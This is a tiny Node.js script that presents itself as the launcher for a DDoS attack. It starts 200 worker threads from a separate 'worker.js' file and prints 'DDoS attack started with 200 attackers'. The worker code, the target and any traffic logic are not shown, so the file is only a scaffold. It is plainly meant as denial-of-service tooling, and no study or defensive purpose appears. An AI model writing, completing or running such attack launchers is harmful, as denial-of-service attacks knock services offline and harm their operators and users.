import { Worker } from "worker_threads";

const attackers = 200;
for (let i = 0; i < attackers; i++) {
    new Worker("./worker.js");
}

console.log("DDoS attack started with", attackers, "attackers");